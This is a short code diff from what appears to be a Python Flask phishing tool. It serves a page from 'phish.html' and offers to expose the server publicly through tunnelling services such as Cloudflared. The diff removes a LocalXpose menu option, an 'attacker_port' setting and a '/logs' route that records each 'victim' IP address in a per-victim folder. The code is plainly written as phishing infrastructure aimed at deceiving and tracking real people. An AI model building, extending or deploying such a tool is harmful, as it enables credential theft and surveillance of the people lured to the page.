@@ -36,7 +36,7 @@ def load_config() -> dict:
         with open(CONFIG_FILE, "r") as file:
             return json.load(file)
     else:
-        return {"localxpose_token": "", "port": "8080", "attacker_port": "9090"}
+        return {"localxpose_token": "", "port": "8080"}
 
 # Save configuration to file
 def save_config(config: dict):
@@ -121,19 +121,6 @@ def phishing_page():
 
     return render_template("phish.html")
 
-# Flask route for logs
-@app.route("/logs", methods=["GET"])
-def logs_page():
-    victim_ip = request.remote_addr
-    victim_folder = os.path.join(DATA_FOLDER, victim_ip)
-    os.makedirs(victim_folder, exist_ok=True)
-
-    log_path = os.path.join(victim_folder, "logs.txt")
-    with open(log_path, "a") as log_file:
-        log_file.write(f"Accessed logs by IP: {victim_ip}\n")
-
-    return render_template("logs.html")
-
 # Main menu
 def main_menu():
     config = load_config()
@@ -141,7 +128,6 @@ def main_menu():
     print("[*] Select an option:")
     print("[1] Localhost")
     print("[2] Cloudflared")
-    print("[3] LocalXpose")
     choice = input("Enter your choice: ").strip()
     if choice == "1":
         app.run(host="127.0.0.1", port=port)
